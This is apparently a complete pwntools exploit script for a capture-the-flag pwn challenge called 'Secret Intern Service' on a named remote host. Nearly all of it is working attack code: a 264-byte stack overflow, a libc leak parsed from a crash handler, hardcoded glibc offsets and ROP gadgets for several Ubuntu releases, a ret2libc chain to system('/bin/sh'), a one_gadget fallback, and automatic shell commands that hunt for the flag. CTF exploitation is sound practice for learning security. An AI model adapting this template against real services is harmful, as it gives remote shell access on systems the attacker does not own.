# -*- coding: utf-8 -*-
"""
Secret Intern Service - CTF Exploit
nc chal.thjcc.org 30001

Confirmed behavior (from debug run):
- stdout AND stderr both go to socket
- crash_handler prints puts() address, then calls main() recursively
- After crash, we get a fresh "Username: " prompt on same connection
- RIP_OFFSET = 264 (256 content + 8 saved RBP)

Exploit chain:
1. Login, send 264-byte overflow + bad RIP -> SIGSEGV
2. Parse "Disconnect handler: 0x..." to get puts() address -> libc base
3. Login again (crash_handler restarted main())
4. Send ROP chain via second gets() overflow: system("/bin/sh")
5. Cat the flag
"""

import sys, io, re, time, os
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

from pwn import *
context.arch      = "amd64"
context.os        = "linux"
context.log_level = "WARNING"  # suppress pwntools Unicode-heavy log lines

# ── Target ──────────────────────────────────────────────────────────────────
HOST = "chal.thjcc.org"
PORT = 30001

# ── Stack offset ─────────────────────────────────────────────────────────────
# Confirmed: gets() starts at msg.content[0]
# To saved RIP = 256 (content) + 8 (saved RBP) = 264
RIP_OFFSET = 264

# ── libc offsets ─────────────────────────────────────────────────────────────
# These are tried in order. The script checks page-alignment of the computed
# libc_base to auto-select the right set.
#
# glibc 2.35  (Ubuntu 22.04 x86_64)
LIBC_VERSIONS = [
    {
        "name":   "glibc 2.35 Ubuntu 22.04",
        "puts":   0x080e50,
        "system": 0x050d60,
        "binsh":  0x1d8678,
        "poprdi": 0x02a3e5,   # pop rdi; ret
        "ret":    0x029cd6,   # ret   (stack alignment)
    },
    {
        "name":   "glibc 2.31 Ubuntu 20.04",
        "puts":   0x084420,
        "system": 0x055410,
        "binsh":  0x1b75aa,
        "poprdi": 0x026b72,
        "ret":    0x025679,
    },
    {
        "name":   "glibc 2.27 Ubuntu 18.04",
        "puts":   0x0809c0,
        "system": 0x04f550,
        "binsh":  0x1b3e1a,
        "poprdi": 0x02164f,
        "ret":    0x00937,
    },
]

def load_libc_from_file(path):
    libc = ELF(path, checksec=False)
    rop = ROP(libc)
    try:
        pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    except Exception:
        pop_rdi = None
    try:
        ret = rop.find_gadget(["ret"]).address
    except Exception:
        ret = None
    try:
        binsh = next(libc.search(b"/bin/sh\x00"))
    except Exception:
        binsh = None
    return libc, pop_rdi, ret, binsh

# ── Helpers ──────────────────────────────────────────────────────────────────
def recv_until_any(r, patterns, timeout=8):
    """Receive until one of the patterns appears."""
    data = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = r.recv(timeout=1)
            if chunk:
                data += chunk
                for pat in patterns:
                    if pat in data:
                        return data
        except Exception:
            break
    return data


def do_login(r, user=b"agent", pwd=b"password"):
    r.recvuntil(b"Username: ")
    r.sendline(user)
    r.recvuntil(b"Password: ")
    r.sendline(pwd)
    r.recvuntil(b"\n\n")   # consume "Welcome, <user>!\n\n"


def send_message(r, payload):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Enter your message: ")
    r.sendline(payload)


# ── Phase 1: leak puts() via crash_handler ───────────────────────────────────
def phase1_leak(r):
    print("[*] Phase 1: crash to leak puts() address")
    do_login(r)

    # Send overflow that lands a bad address in saved RIP -> SIGSEGV
    crash_payload = b"A" * RIP_OFFSET + p64(0xdeadbeefcafebabe)
    send_message(r, crash_payload)

    # Collect until we see "Username: " (crash_handler restarted main())
    print("[*] Waiting for crash dump + restart...")
    data = recv_until_any(r, [b"Username: "], timeout=12)

    print(f"[dbg] crash dump ({len(data)} bytes):")
    print(data.decode(errors='replace'))

    m = re.search(rb"Disconnect handler:\s+(0x[0-9a-fA-F]+)", data)
    if not m:
        print("[-] Could not find 'Disconnect handler' in crash output!")
        print(f"    Raw: {data!r}")
        sys.exit(1)

    puts_addr = int(m.group(1), 16)
    print(f"[+] puts() = 0x{puts_addr:016x}")
    return puts_addr


# ── Select libc version by checking page-alignment ───────────────────────────
def pick_libc(puts_addr, libc_path=None):
    if libc_path:
        if not os.path.exists(libc_path):
            print(f"[!] libc file not found: {libc_path}")
        else:
            libc, pop_rdi, ret, binsh = load_libc_from_file(libc_path)
            if "puts" not in libc.symbols:
                print("[!] libc file missing puts symbol; falling back to hardcoded list.")
            else:
                base = puts_addr - libc.symbols["puts"]
                print(f"[+] Using libc file: {libc_path}")
                print(f"    base     = 0x{base:016x}")
                return {
                    "name": os.path.basename(libc_path),
                    "puts": libc.symbols["puts"],
                    "system": libc.symbols.get("system", None),
                    "binsh": binsh,
                    "poprdi": pop_rdi,
                    "ret": ret,
                }, base

    for v in LIBC_VERSIONS:
        base = puts_addr - v["puts"]
        if base & 0xfff == 0:
            print(f"[+] Matched libc: {v['name']}")
            print(f"    base     = 0x{base:016x}")
            return v, base
    # Fallback: use first entry and warn
    v = LIBC_VERSIONS[0]
    base = puts_addr - v["puts"]
    print(f"[!] No exact match. Using {v['name']} (base=0x{base:x}, NOT page-aligned!)")
    print("    You may need to adjust offsets or supply a libc file.")
    return v, base


# ── Phase 2: ret2libc ─────────────────────────────────────────────────────────
def phase2_shell(r, libc, libc_base):
    if libc.get("system") is None or libc.get("binsh") is None:
        print("[!] Missing system/binsh offsets; cannot continue.")
        sys.exit(1)
    if libc.get("poprdi") is None:
        print("[!] Missing pop rdi gadget; cannot continue.")
        sys.exit(1)
    if libc.get("ret") is None:
        print("[!] Missing ret gadget; cannot continue.")
        sys.exit(1)

    system = libc_base + libc["system"]
    binsh  = libc_base + libc["binsh"]
    poprdi = libc_base + libc["poprdi"]
    ret    = libc_base + libc["ret"]

    print(f"[*] Phase 2: ret2libc")
    print(f"    system()   = 0x{system:016x}")
    print(f"    /bin/sh    = 0x{binsh:016x}")
    print(f"    pop rdi    = 0x{poprdi:016x}")

    # crash_handler called main() — it already printed "Username: "
    # We consumed up to "Username: " in phase1_leak, so just send creds now
    print("[*] Sending credentials for restarted session...")
    r.sendline(b"hacker")
    r.recvuntil(b"Password: ")
    r.sendline(b"h4ck3r")
    r.recvuntil(b"\n\n")

    # ROP: [padding][ret][pop rdi; ret]["/bin/sh" addr][system addr]
    rop  = b"B" * RIP_OFFSET
    rop += p64(ret)      # stack alignment (system needs RSP % 16 == 0)
    rop += p64(poprdi)   # pop rdi; ret
    rop += p64(binsh)    # rdi = &"/bin/sh"
    rop += p64(system)   # system("/bin/sh")

    print(f"[*] Sending ROP payload ({len(rop)} bytes)...")
    send_message(r, rop)
    print("[+] Payload sent!")


# ── One-gadget fallback ───────────────────────────────────────────────────────
ONE_GADGETS_2_35 = [0xe3afe, 0xe3b01, 0xe3b04]

def phase2_one_gadget(r, libc_base):
    """Fallback: try one_gadget offsets if ret2libc fails."""
    print("[*] Trying one_gadget fallback...")
    for og in ONE_GADGETS_2_35:
        addr = libc_base + og
        print(f"    trying 0x{addr:x} ...")
        try:
            r2 = remote(HOST, PORT)
            r2.recvuntil(b"Username: ")
            r2.sendline(b"x")
            r2.recvuntil(b"Password: ")
            r2.sendline(b"x")
            r2.recvuntil(b"\n\n")
            r2.recvuntil(b"> ")
            r2.sendline(b"1")
            r2.recvuntil(b"Enter your message: ")
            r2.sendline(b"X" * RIP_OFFSET + p64(addr))
            r2.sendline(b"id")
            out = r2.recv(timeout=3)
            if b"uid=" in out:
                print(f"[+] one_gadget 0x{og:x} works!")
                print(out.decode(errors='replace'))
                return r2
            r2.close()
        except Exception as e:
            pass
    return None


# ── Grab flag ────────────────────────────────────────────────────────────────
def grab_flag(r):
    """Auto-execute commands to find and print the flag."""
    time.sleep(0.5)
    cmds = [
        b"id",
        b"ls -la",
        b"cat flag.txt",
        b"cat flag",
        b"ls /",
        b"cat /flag.txt",
        b"cat /flag",
        b"find / -maxdepth 3 -name 'flag*' 2>/dev/null",
    ]
    for cmd in cmds:
        r.sendline(cmd)
        time.sleep(0.4)
        try:
            out = r.recv(timeout=2)
            txt = out.decode(errors='replace')
            print(f"[shell]$ {cmd.decode()}")
            print(txt)
            if any(x in out for x in [b"THJCC{", b"flag{", b"CTF{", b"thjcc{"]):
                print("\n>>> FLAG FOUND! <<<")
                return
        except Exception:
            pass


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    import argparse, os
    parser = argparse.ArgumentParser()
    parser.add_argument("--libc", dest="libc_path", default=None, help="Path to libc.so.6 from target")
    args = parser.parse_args()

    print("+--------------------------------------------------+")
    print("|   Secret Intern Service - CTF Exploit           |")
    print("+--------------------------------------------------+")

    r = remote(HOST, PORT)
    r.recvuntil(b"Service initialized.\n")

    # Phase 1: crash -> leak puts() address
    puts_addr = phase1_leak(r)

    # Select correct libc version based on page alignment
    libc, libc_base = pick_libc(puts_addr, libc_path=args.libc_path)

    # Phase 2: ret2libc shell
    phase2_shell(r, libc, libc_base)

    # Auto-cat the flag
    grab_flag(r)

    # Drop to interactive for manual exploration
    print("\n[*] Going interactive. Try: cat flag* or cat /flag*")
    r.interactive()


if __name__ == "__main__":
    main()
